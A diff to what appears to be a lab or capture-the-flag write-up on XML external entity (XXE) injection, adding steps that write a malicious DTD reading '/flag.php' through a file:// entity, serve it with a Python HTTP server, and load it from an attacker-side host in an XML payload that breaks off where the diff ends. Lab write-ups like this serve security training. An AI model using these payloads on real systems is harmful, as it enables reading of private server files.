@@ -69,10 +69,19 @@ done
 
 >**Q. Use either method from this section to read the flag at '/flag.php'. (You may use the CDATA method at '/index.php', or the error-based method at '/error').**
 
+```bash
+sudo nano xxe.dtd
+```
+
 ```dtd
 <!ENTITY % file SYSTEM "file:///flag.php">
 <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
 ```
+
+```bash
+python3 -m http.server 8000
+```
+
 ```xml
 <!DOCTYPE email [ 
   <!ENTITY % remote SYSTEM "http://10.10.15.1:8000/xxe.dtd">
